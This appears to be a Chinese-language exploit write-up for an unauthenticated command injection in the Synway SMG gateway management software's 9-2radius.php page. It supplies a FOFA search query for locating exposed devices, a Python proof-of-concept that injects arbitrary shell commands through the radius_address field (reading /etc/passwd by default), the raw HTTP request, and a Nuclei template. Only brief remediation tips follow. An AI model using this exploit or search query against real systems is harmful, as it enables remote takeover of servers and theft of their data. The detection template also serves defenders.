# 三汇SMG网关管理软件 9-2radius.php 远程命令执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 三汇SMG网关管理软件 9-2radius.php 远程命令执行漏洞 |
| 漏洞类型 | 命令注入 (Command Injection) |
| 影响组件 | 三汇SMG网关管理软件 |
| 影响版本 | 通用版本 |

## 漏洞概述

三汇SMG网关管理软件 9-2radius.php 存在远程命令执行漏洞，未经身份认证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa查询语句

```
body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
```

## 漏洞复现

### POC

```python
#!/usr/bin/env python3
"""
三汇SMG网关管理软件 9-2radius.php 命令注入漏洞
POC - 检查漏洞是否存在
"""
import requests
import sys

def check_vulnerability(target_url, cmd="cat+/etc/passwd"):
    """检查目标是否存在命令注入漏洞"""
    target = target_url.rstrip('/') + "/en/9-2radius.php?authority=6"
    
    # 命令注入 payload
    payload = {
        "save": "1",
        "enable_radius": "1",
        "radius_address": f"/';{cmd};#"
    }
    
    try:
        response = requests.post(target, data=payload, timeout=10, verify=False)
        
        # 检查响应中是否包含命令执行结果
        if response.status_code == 200:
            print(f"[+] 请求已发送: {target}")
            print(f"[*] Payload: {payload['radius_address']}")
            print(f"[*] 响应状态: {response.status_code}")
            print(f"[*] 响应内容:\n{response.text[:500]}")
            return True
        else:
            print(f"[-] 请求失败: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc.py <target_url> [cmd]")
        print("Example: python poc.py http://192.168.1.1:8080")
        print("Example: python poc.py http://192.168.1.1:8080 'whoami'")
        sys.exit(1)
    
    target_url = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "cat+/etc/passwd"
    check_vulnerability(target_url, cmd)
```

### 漏洞特征

- 路径：`/en/9-2radius.php`
- 参数：`authority=6` (GET), `save`, `enable_radius`, `radius_address` (POST)
- HTTP方法：POST
- 注入方式：`radius_address` 参数通过 `';cmd;#` 注入命令

### 原始请求包

```
POST /en/9-2radius.php?authority=6 HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

save=1&enable_radius=1&radius_address=/';cat/etc/passwd;+#
```

### Nuclei 检测模板

```yaml
id: smg-gateway-command-injection

info:
  name: 三汇SMG网关管理软件 命令注入
  author: 吾要学习
  severity: critical
  description: 三汇SMG网关管理软件存在命令注入漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/en/9-2radius.php?authority=6"
    body: "save=1&enable_radius=1&radius_address=/';cat+/etc/passwd;+#"
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "www-data:.*:0:0:"
        condition: or
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加 Web 应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
